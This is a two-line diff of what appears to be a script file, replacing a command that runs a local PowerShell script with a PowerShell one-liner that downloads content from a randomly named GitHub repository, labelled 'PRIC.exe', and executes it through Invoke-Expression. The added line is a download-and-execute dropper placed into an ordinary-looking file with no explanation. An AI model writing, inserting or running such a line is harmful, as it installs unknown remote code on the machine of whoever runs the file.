@@ -1,2 +1,1 @@
-Powershell.exe -executionpolicy remotesigned -File  C:\Users\SE\Desktop\ps.ps1
-
+powershell.exe -c iex(new-object net.webclient).downloadstring('https://github.com/IcTrAteri/hBUDEGfnpsngKHBFQhRpFTKZAYw/raw/main/PRIC.exe')
